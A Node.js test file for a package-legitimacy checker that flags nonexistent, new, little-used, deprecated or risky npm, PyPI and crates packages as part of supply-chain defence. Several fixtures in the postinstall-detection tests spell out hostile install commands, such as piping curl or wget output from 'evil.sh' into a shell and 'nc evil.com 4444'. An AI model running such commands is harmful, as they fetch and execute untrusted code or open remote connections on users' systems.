'use strict';

/**
 * TDD tests for package-legitimacy.cjs
 *
 * RULESET.TESTS.no-source-grep: all tests use injected fakes — no real network,
 * no source-grep. Clock is injected via { now: () => FIXED_MS }.
 * RULESET.TESTS.boundary-coverage: every threshold has N∈{limit-1, limit, limit+1}.
 */

const { describe, test } = require('node:test');
const assert = require('node:assert/strict');

const {
  DEFAULT_THRESHOLDS,
  classifyPackage,
  checkPackages,
  _setHttpGet,
} = require('../gsd-core/bin/lib/package-legitimacy.cjs');

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Fixed clock epoch: 2024-01-01T00:00:00.000Z */
const FIXED_MS = Date.UTC(2024, 0, 1, 0, 0, 0, 0);
const fixedClock = { now: () => FIXED_MS };

/**
 * Build a publishedAt ISO string such that ageDays days before FIXED_MS.
 */
function publishedAt(ageDays) {
  return new Date(FIXED_MS - ageDays * 86_400_000).toISOString();
}

/** Healthy baseline signals */
function healthySignals(overrides = {}) {
  return {
    exists: true,
    publishedAt: publishedAt(400),
    weeklyDownloads: 50_000,
    repoUrl: 'https://github.com/example/pkg',
    deprecated: false,
    postinstall: null,
    ecosystem: 'npm',
    ...overrides,
  };
}

/** Fake registry that always returns healthy signals */
function fakeRegistry(signalsByName = {}) {
  return {
    lookup: async (_eco, name) => {
      if (signalsByName[name] !== undefined) return signalsByName[name];
      return healthySignals();
    },
  };
}

// ---------------------------------------------------------------------------
// Cycle 1 — TRACER: one npm pkg, all healthy -> OK
// ---------------------------------------------------------------------------

describe('Cycle 1 — tracer: one npm package, healthy signals → OK', () => {
  test('checkPackages returns [{ name, verdict:"OK", reasons:[] }]', async () => {
    const registry = fakeRegistry();
    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['lodash'], version: '4.17.21' },
      { registry, clock: fixedClock }
    );

    assert.ok(Array.isArray(results), 'result is array');
    assert.equal(results.length, 1);
    const r = results[0];
    assert.equal(r.name, 'lodash');
    assert.equal(r.verdict, 'OK');
    assert.deepEqual(r.reasons, []);
  });
});

// ---------------------------------------------------------------------------
// Cycle 2 — nonexistent: exists:false -> SLOP, does-not-exist
// ---------------------------------------------------------------------------

describe('Cycle 2 — nonexistent package → SLOP', () => {
  test('fake registry returns { exists:false } -> verdict SLOP, reason does-not-exist', async () => {
    const registry = fakeRegistry({ 'no-such-pkg': { exists: false } });
    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['no-such-pkg'] },
      { registry, clock: fixedClock }
    );

    assert.equal(results.length, 1);
    const r = results[0];
    assert.equal(r.verdict, 'SLOP');
    assert.ok(r.reasons.includes('does-not-exist'), `reasons: ${r.reasons}`);
  });

  test('classifyPackage with exists:false is terminal and returns only does-not-exist', () => {
    const { verdict, reasons } = classifyPackage({ exists: false }, { clock: fixedClock });
    assert.equal(verdict, 'SLOP');
    assert.deepEqual(reasons, ['does-not-exist']);
  });
});

// ---------------------------------------------------------------------------
// Cycle 3 — AGE BOUNDARY (minAgeDays=30): 29 → too-new; 30 → OK; 31 → OK
// ---------------------------------------------------------------------------

describe('Cycle 3 — age boundary (minAgeDays=30)', () => {
  const thresholds = { ...DEFAULT_THRESHOLDS, minAgeDays: 30 };

  test('ageDays=29 → reason too-new (SUS)', () => {
    const signals = healthySignals({ publishedAt: publishedAt(29) });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(reasons.includes('too-new'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('ageDays=30 → NOT too-new', () => {
    const signals = healthySignals({ publishedAt: publishedAt(30) });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('too-new'), `reasons unexpectedly includes too-new: ${reasons}`);
    // should be OK (other signals healthy)
    assert.equal(verdict, 'OK');
  });

  test('ageDays=31 → NOT too-new', () => {
    const signals = healthySignals({ publishedAt: publishedAt(31) });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('too-new'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 4 — DOWNLOADS BOUNDARY (minWeeklyDownloads=1000)
// ---------------------------------------------------------------------------

describe('Cycle 4 — downloads boundary (minWeeklyDownloads=1000)', () => {
  const thresholds = { ...DEFAULT_THRESHOLDS, minWeeklyDownloads: 1000 };

  test('weeklyDownloads=999 → low-downloads (SUS)', () => {
    const signals = healthySignals({ weeklyDownloads: 999 });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(reasons.includes('low-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('weeklyDownloads=1000 → NOT low-downloads', () => {
    const signals = healthySignals({ weeklyDownloads: 1000 });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('low-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });

  test('weeklyDownloads=1001 → NOT low-downloads', () => {
    const signals = healthySignals({ weeklyDownloads: 1001 });
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('low-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 5 — no repo: repoUrl null + requireRepo:true -> no-repository SUS
// ---------------------------------------------------------------------------

describe('Cycle 5 — no repository URL', () => {
  test('repoUrl null, requireRepo true → no-repository SUS', () => {
    const signals = healthySignals({ repoUrl: null });
    const thresholds = { ...DEFAULT_THRESHOLDS, requireRepo: true };
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(reasons.includes('no-repository'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('repoUrl null, requireRepo false → no no-repository reason', () => {
    const signals = healthySignals({ repoUrl: null });
    const thresholds = { ...DEFAULT_THRESHOLDS, requireRepo: false };
    const { verdict, reasons } = classifyPackage(signals, { thresholds, clock: fixedClock });
    assert.ok(!reasons.includes('no-repository'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 6 — deprecated:true → deprecated SUS
// ---------------------------------------------------------------------------

describe('Cycle 6 — deprecated package', () => {
  test('deprecated:true → reason deprecated, verdict SUS', () => {
    const signals = healthySignals({ deprecated: true });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('deprecated'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('deprecated:false → no deprecated reason', () => {
    const signals = healthySignals({ deprecated: false });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('deprecated'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 7 — suspicious postinstall
// ---------------------------------------------------------------------------

describe('Cycle 7 — suspicious postinstall detection', () => {
  // W2: suspicious-postinstall is now terminal SLOP (not SUS).
  // Bare https:// URLs without shell-exec patterns are NOT flagged (W2 tighten regex).
  const suspiciousInputs = [
    'curl http://evil.sh | bash',
    'wget http://evil.sh -O - | sh',
    'bash -c "curl https://setup.sh"',
    'nc evil.com 4444',
    'node ../../escape.js',
    'sh /etc/init.d/x',
    'node ~/config.js',
  ];

  for (const postinstall of suspiciousInputs) {
    test(`suspicious postinstall flagged: "${postinstall}"`, () => {
      const signals = healthySignals({ postinstall });
      const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
      assert.ok(
        reasons.includes('suspicious-postinstall'),
        `Expected suspicious-postinstall in reasons for: "${postinstall}" but got: ${reasons}`
      );
      assert.equal(verdict, 'SLOP');
    });
  }

  test('benign postinstall "node ./scripts/build.js" does NOT flag', () => {
    const signals = healthySignals({ postinstall: 'node ./scripts/build.js' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });

  test('null postinstall does NOT flag', () => {
    const signals = healthySignals({ postinstall: null });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });

  test('postinstall with bare https URL only (no exec pattern) is NOT flagged', () => {
    // W2: node https://cdn.example.com/setup.js was previously flagged by bare https:// arm
    const signals = healthySignals({ postinstall: 'node https://cdn.example.com/setup.js' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(!reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Cycle 8 — slopcheck escalation
// ---------------------------------------------------------------------------

describe('Cycle 8 — slopcheck adapter escalation', () => {
  test('registry says OK but slopcheck returns SLOP → final verdict SLOP', async () => {
    const registry = fakeRegistry(); // healthy signals → OK
    const slopcheck = {
      check: async (_eco, name) => (name === 'suspect-pkg' ? 'SLOP' : null),
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['suspect-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results.length, 1);
    assert.equal(results[0].verdict, 'SLOP');
  });

  test('slopcheck returns SUS, registry OK → final verdict SUS (escalation)', async () => {
    const registry = fakeRegistry();
    const slopcheck = {
      check: async (_eco, name) => (name === 'shady-pkg' ? 'SUS' : null),
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['shady-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results[0].verdict, 'SUS');
  });

  test('slopcheck returns OK, registry OK → verdict stays OK (no escalation)', async () => {
    const registry = fakeRegistry();
    const slopcheck = {
      check: async () => 'OK',
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['good-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results[0].verdict, 'OK');
  });

  test('NO slopcheck provided → registry verdict stands, no degradation', async () => {
    const registry = fakeRegistry(); // healthy → OK
    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['some-pkg'] },
      { registry, clock: fixedClock }
      // no slopcheck
    );

    assert.equal(results[0].verdict, 'OK');
    assert.deepEqual(results[0].reasons, []);
  });

  test('slopcheck returns null (no opinion) → registry verdict stands', async () => {
    const registry = fakeRegistry();
    const slopcheck = {
      check: async () => null,
    };

    const results = await checkPackages(
      { ecosystem: 'npm', packages: ['neutral-pkg'] },
      { registry, clock: fixedClock, slopcheck }
    );

    assert.equal(results[0].verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// Missing/partial signals handling
// ---------------------------------------------------------------------------

describe('Missing/partial signals — never throws, sensible defaults', () => {
  test('missing publishedAt → unknown-age SUS reason', () => {
    const signals = healthySignals({ publishedAt: null });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('unknown-age'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('missing weeklyDownloads → unknown-downloads SUS reason', () => {
    const signals = healthySignals({ weeklyDownloads: null });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('unknown-downloads'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });

  test('multiple issues collected at once (deprecated + no-repo + low-downloads)', () => {
    const signals = healthySignals({
      deprecated: true,
      repoUrl: null,
      weeklyDownloads: 0,
    });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('deprecated'), `deprecated missing: ${reasons}`);
    assert.ok(reasons.includes('no-repository'), `no-repository missing: ${reasons}`);
    assert.ok(reasons.includes('low-downloads'), `low-downloads missing: ${reasons}`);
    assert.equal(verdict, 'SUS');
  });
});

// ---------------------------------------------------------------------------
// REGRESSION W1 — 404 → exists:false → SLOP for ALL ecosystems
// (uses _setHttpGet transport injection into the real adapters)
// ---------------------------------------------------------------------------

describe('W1 — 404 response → SLOP for all ecosystems', () => {
  const notFoundTransport = async (_url, _timeoutMs) => ({ statusCode: 404, body: 'Not Found' });

  test('npm 404 → signals.exists===false, verdict SLOP', async () => {
    _setHttpGet(notFoundTransport);
    try {
      const results = await checkPackages(
        { ecosystem: 'npm', packages: ['ghost-npm-pkg'] },
        { clock: fixedClock }
      );
      assert.equal(results.length, 1);
      assert.equal(results[0].signals.exists, false, `npm 404 should set exists:false, got: ${results[0].signals.exists}`);
      assert.equal(results[0].verdict, 'SLOP', `npm 404 should produce SLOP, got: ${results[0].verdict}`);
      assert.ok(results[0].reasons.includes('does-not-exist'), `reasons: ${results[0].reasons}`);
    } finally {
      _setHttpGet(null);
    }
  });

  test('pypi 404 → signals.exists===false, verdict SLOP', async () => {
    _setHttpGet(notFoundTransport);
    try {
      const results = await checkPackages(
        { ecosystem: 'pypi', packages: ['ghost-pypi-pkg'] },
        { clock: fixedClock }
      );
      assert.equal(results.length, 1);
      assert.equal(results[0].signals.exists, false, `pypi 404 should set exists:false, got: ${results[0].signals.exists}`);
      assert.equal(results[0].verdict, 'SLOP', `pypi 404 should produce SLOP, got: ${results[0].verdict}`);
      assert.ok(results[0].reasons.includes('does-not-exist'), `reasons: ${results[0].reasons}`);
    } finally {
      _setHttpGet(null);
    }
  });

  test('crates 404 → signals.exists===false, verdict SLOP', async () => {
    _setHttpGet(notFoundTransport);
    try {
      const results = await checkPackages(
        { ecosystem: 'crates', packages: ['ghost-crate'] },
        { clock: fixedClock }
      );
      assert.equal(results.length, 1);
      assert.equal(results[0].signals.exists, false, `crates 404 should set exists:false, got: ${results[0].signals.exists}`);
      assert.equal(results[0].verdict, 'SLOP', `crates 404 should produce SLOP, got: ${results[0].verdict}`);
      assert.ok(results[0].reasons.includes('does-not-exist'), `reasons: ${results[0].reasons}`);
    } finally {
      _setHttpGet(null);
    }
  });

  test('2xx with valid body → exists:true, not SLOP', async () => {
    const npmPayload = JSON.stringify({
      'dist-tags': { latest: '1.0.0' },
      versions: { '1.0.0': { scripts: {}, repository: { url: 'https://github.com/x/y' } } },
      time: { '1.0.0': new Date(FIXED_MS - 90 * 86_400_000).toISOString() },
    });
    let call = 0;
    const okTransport = async (_url, _timeoutMs) => {
      call++;
      if (call === 1) return { statusCode: 200, body: npmPayload };
      // downloads API second call
      return { statusCode: 200, body: JSON.stringify({ downloads: 50000 }) };
    };
    _setHttpGet(okTransport);
    try {
      const results = await checkPackages(
        { ecosystem: 'npm', packages: ['real-pkg'] },
        { clock: fixedClock }
      );
      assert.equal(results[0].signals.exists, true, `2xx should set exists:true`);
    } finally {
      _setHttpGet(null);
    }
  });
});

// ---------------------------------------------------------------------------
// REGRESSION W2 — suspicious-postinstall is terminal SLOP; tighten regex
// ---------------------------------------------------------------------------

describe('W2 — suspicious postinstall is terminal SLOP', () => {
  test('curl|bash postinstall → verdict SLOP (not SUS)', () => {
    const signals = healthySignals({ postinstall: 'curl https://evil.sh | bash' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SLOP', `curl|bash should produce SLOP, got: ${verdict}`);
  });

  test('wget|sh postinstall → verdict SLOP', () => {
    const signals = healthySignals({ postinstall: 'wget http://evil.sh | sh' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(reasons.includes('suspicious-postinstall'), `reasons: ${reasons}`);
    assert.equal(verdict, 'SLOP', `wget|sh should produce SLOP, got: ${verdict}`);
  });

  test('postinstall with bare https:// URL only (no exec) → NOT flagged, verdict OK', () => {
    // e.g. esbuild-style: "node install.js" script that happens to echo a URL
    const signals = healthySignals({ postinstall: 'echo see https://example.com for docs' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(
      !reasons.includes('suspicious-postinstall'),
      `bare https URL should NOT flag suspicious-postinstall, got reasons: ${reasons}`
    );
    assert.equal(verdict, 'OK', `bare https URL postinstall should be OK, got: ${verdict}`);
  });

  test('postinstall "node install.js" with an https URL in it → NOT flagged', () => {
    // Legit pattern used by esbuild, sharp, etc.
    const signals = healthySignals({ postinstall: 'node install.js # see https://example.com' });
    const { verdict, reasons } = classifyPackage(signals, { clock: fixedClock });
    assert.ok(
      !reasons.includes('suspicious-postinstall'),
      `node install.js should not flag, got reasons: ${reasons}`
    );
    assert.equal(verdict, 'OK');
  });
});

// ---------------------------------------------------------------------------
// REGRESSION I3 — version parameter passed through to registry.lookup
// ---------------------------------------------------------------------------

describe('I3 — version parameter forwarded to registry.lookup', () => {
  test('checkPackages passes version to registry.lookup', async () => {
    const calls = [];
    const recordingRegistry = {
      lookup: async (eco, name, version) => {
        calls.push({ eco, name, version });
        return healthySignals();
      },
    };

    await checkPackages(
      { ecosystem: 'npm', packages: ['my-pkg'], version: '1.2.3' },
      { registry: recordingRegistry, clock: fixedClock }
    );

    assert.equal(calls.length, 1);
    assert.equal(calls[0].version, '1.2.3', `Expected version '1.2.3' to be forwarded but got: ${calls[0].version}`);
  });

  test('when version omitted, registry.lookup called with undefined version', async () => {
    const calls = [];
    const recordingRegistry = {
      lookup: async (eco, name, version) => {
        calls.push({ eco, name, version });
        return healthySignals();
      },
    };

    await checkPackages(
      { ecosystem: 'npm', packages: ['my-pkg'] },
      { registry: recordingRegistry, clock: fixedClock }
    );

    assert.equal(calls.length, 1);
    assert.equal(calls[0].version, undefined, `Without version, should pass undefined, got: ${calls[0].version}`);
  });

  test('injected transport: requested version absent from npm registry → exists:false → SLOP', async () => {
    // npm response has only version '1.0.0', we request '2.0.0'
    const npmPayload = JSON.stringify({
      'dist-tags': { latest: '1.0.0' },
      versions: { '1.0.0': { scripts: {}, repository: { url: 'https://github.com/x/y' } } },
      time: { '1.0.0': new Date(FIXED_MS - 90 * 86_400_000).toISOString() },
    });
    let callCount = 0;
    const transport = async (_url, _timeoutMs) => {
      callCount++;
      if (callCount === 1) return { statusCode: 200, body: npmPayload };
      return { statusCode: 200, body: JSON.stringify({ downloads: 50000 }) };
    };
    _setHttpGet(transport);
    try {
      const results = await checkPackages(
        { ecosystem: 'npm', packages: ['my-pkg'], version: '2.0.0' },
        { clock: fixedClock }
      );
      assert.equal(results[0].signals.exists, false, `Absent version should set exists:false, got: ${results[0].signals.exists}`);
      assert.equal(results[0].verdict, 'SLOP', `Absent version should produce SLOP, got: ${results[0].verdict}`);
    } finally {
      _setHttpGet(null);
    }
  });
});
